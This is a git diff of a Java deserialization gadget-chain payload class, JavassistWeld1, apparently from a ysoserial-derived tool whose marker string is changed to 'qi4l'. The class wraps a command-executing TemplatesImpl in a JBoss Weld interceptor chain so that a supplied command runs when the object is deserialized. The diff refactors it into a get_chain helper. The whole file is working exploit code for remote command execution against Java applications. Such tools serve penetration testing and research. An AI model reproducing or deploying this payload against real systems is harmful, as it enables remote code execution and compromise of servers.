@@ -17,7 +17,6 @@ import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
 import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
 import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
 import org.jboss.weld.interceptor.spi.model.InterceptionModel;
-import org.jboss.weld.interceptor.spi.model.InterceptionType;
 
 import java.lang.reflect.Constructor;
 import java.util.*;
@@ -26,7 +25,7 @@ import java.util.*;
 /*
     by @matthias_kaiser
 */
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final",
         "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
         "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21"})
@@ -34,15 +33,29 @@ import java.util.*;
 public class JavassistWeld1 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
-        final Object tpl;
-        tpl = Gadgets.createTemplatesImpl(command);
+
+        return get_chain(command, org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, null);
+    }
+
+    static Object get_chain(
+            String command,
+            org.jboss.weld.interceptor.spi.model.InterceptionType POST_ACTIVATE,
+            org.jboss.interceptor.spi.model.InterceptionType POST_ACTIVATE1
+    ) throws Exception {
+        Object tpl = Gadgets.createTemplatesImpl(command);
 
         InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
         ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
         InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);
 
-        Set<InterceptionType> s = new HashSet<InterceptionType>();
-        s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
+        Set s = new HashSet<>();
+
+        if (POST_ACTIVATE != null) {
+            s.add(POST_ACTIVATE);
+        } else {
+            s.add(POST_ACTIVATE1);
+        }
+
 
         Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
         Reflections.setAccessible(defaultMethodMetadataConstructor);
@@ -51,9 +64,14 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
 
         List list = new ArrayList();
         list.add(methodMetadata);
-        Map<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
+        Map hashMap = new HashMap<>();
 
-        hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
+        if (POST_ACTIVATE != null) {
+            hashMap.put(POST_ACTIVATE, list);
+        } else {
+            hashMap.put(POST_ACTIVATE1, list);
+        }
+
         SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
 
         builder.interceptAll().with(simpleInterceptorMetadata);
@@ -61,19 +79,12 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         InterceptionModel model = builder.build();
 
         HashMap map = new HashMap();
-        map.put("ysoserial", "ysoserial");
+        map.put("qi4l", "qi4l");
 
         DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
 
-        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
-
-            public Object createFor(InterceptorReference paramInterceptorReference) {
-
-                return tpl;
-            }
-        };
+        InterceptorInstantiator interceptorInstantiator = paramInterceptorReference -> tpl;
 
         return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
-
     }
 }
